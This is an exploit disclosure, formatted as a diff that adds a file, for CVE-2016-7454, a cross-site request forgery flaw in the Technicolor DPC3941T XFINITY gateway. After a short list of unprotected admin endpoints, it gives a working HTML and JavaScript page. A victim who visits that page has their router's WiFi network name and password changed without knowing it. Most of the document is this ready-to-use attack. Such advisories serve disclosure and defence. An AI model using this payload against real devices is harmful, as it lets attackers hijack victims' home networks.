@@ -1,0 +1,43 @@
+# Exploit Title: CSRF XFINITY Gateway product Technicolor(previously Cisco) DPC3941T
+# Date: 09/08/2016
+# Exploit Author: Ayushman Dutta
+# Version:  dpc3941-P20-18-v303r20421733-160413a-CMCST
+# CVE : CVE-2016-7454
+
+The Device DPC3941T is vulnerable to CSRF and has no security on the entire
+admin panel for it.
+Some of the links are at:
+
+<IP Address>/actionHandler/ajax_remote_management.php
+<IP Address>/actionHandler/ajaxSet_wireless_network_configuration_edit.php
+<IP Address>/actionHandler/ajax_network_diagnostic_tools.php
+<IP Address>/actionHandler/ajax_at_a_glance.php
+
+A simple HTML page with javascript on which the attacker lures the victim
+can be used to change state in the application.
+
+<html>
+<head>
+<title>
+Lets CSRF Xfinity to change Wifi Password
+</title>
+</head>
+<script>
+function jsonreq() {
+var json_upload = "configInfo=" + JSON.stringify({"radio_enable":"true",
+"network_name":"MyName", "wireless_mode":"a,n,ac",
+"security":"WPAWPA2_PSK_TKIPAES", "channel_automatic":"true",
+"channel_number":"40", "network_password":"password",
+"broadcastSSID":"true", "enableWMM":"true", "ssid_number":"1"});
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.withCredentials = true;
+xmlhttp.open("POST","
+http://10.0.0.1/actionHandler/ajaxSet_wireless_network_configuration_edit.php",
+true);
+xmlhttp.setRequestHeader("Content-Type",
+"application/x-www-form-urlencoded");
+xmlhttp.send(json_upload);
+}
+jsonreq();
+</script>
+</html>
